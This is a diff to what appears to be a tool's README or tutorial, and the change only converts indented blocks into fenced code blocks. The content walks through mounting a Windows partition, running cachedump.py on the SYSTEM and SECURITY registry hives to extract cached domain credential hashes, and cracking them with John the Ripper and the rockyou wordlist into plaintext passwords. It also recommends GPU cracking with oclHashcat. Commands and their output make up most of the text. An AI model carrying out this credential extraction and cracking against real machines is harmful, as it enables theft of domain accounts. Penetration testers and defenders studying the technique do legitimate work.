@@ -24,24 +24,28 @@ Mount a Windows 7/Vista partition:
     # ntfs-3g /dev/sda1 /mnt/win
 
 Run cachedump.py on the SYSTEM and SECURITY hives to extract cached domain creds:
-    # ./cachedump.py
-    usage: ./cachedump.py <system hive> <security hive> <Vista/7>
+```
+# ./cachedump.py
+usage: ./cachedump.py <system hive> <security hive> <Vista/7>
 
-    Example (Windows Vista/7):
-    ./cachedump.py /path/to/System32/config/SYSTEM /path/to/System32/config/SECURITY true
+Example (Windows Vista/7):
+./cachedump.py /path/to/System32/config/SYSTEM /path/to/System32/config/SECURITY true
 
-    Example (Windows XP):
-    ./cachedump.py /path/to/System32/SYSTEM /path/to/System32/config/SECURITY false
+Example (Windows XP):
+./cachedump.py /path/to/System32/SYSTEM /path/to/System32/config/SECURITY false
 
-    # ./cachedump.py /mnt/win/Windows/System32/config/SYSTEM /mnt/win/Windows/System32/config/SECURITY true |tee hashes
-    nharpsis:6b29dfa157face3f3d8db489aec5cc12:acme:acme.local
-    god:25bd785b8ff1b7fa3a9b9e069a5e7de7:acme:acme.local
+# ./cachedump.py /mnt/win/Windows/System32/config/SYSTEM /mnt/win/Windows/System32/config/SECURITY true |tee hashes
+nharpsis:6b29dfa157face3f3d8db489aec5cc12:acme:acme.local
+god:25bd785b8ff1b7fa3a9b9e069a5e7de7:acme:acme.local
+```
 
 If you want to crack the hashes and have a good wordlist, John can be used. The hashes are in the 'mscash2' format:
-    # john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt hashes
-    Loaded 2 password hashes with 2 different salts (M$ Cache Hash 2 (DCC2) PBKDF2-HMAC-SHA-1 [128/128 SSE2 intrinsics 8x])
-    g0d              (god)
-    Welcome1!        (nharpsis)
+```
+# john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt hashes
+Loaded 2 password hashes with 2 different salts (M$ Cache Hash 2 (DCC2) PBKDF2-HMAC-SHA-1 [128/128 SSE2 intrinsics 8x])
+g0d              (god)
+Welcome1!        (nharpsis)
+```
 
 We now have the passwords for two domain users. Note: these passwords are really simple and I knew they were in the wordlist I used. Normally if you want to actually bruteforce the passwords, I wouldn't recommend John. Pull the hashes and use a GPU powered cracking box with oclHashcat.
 
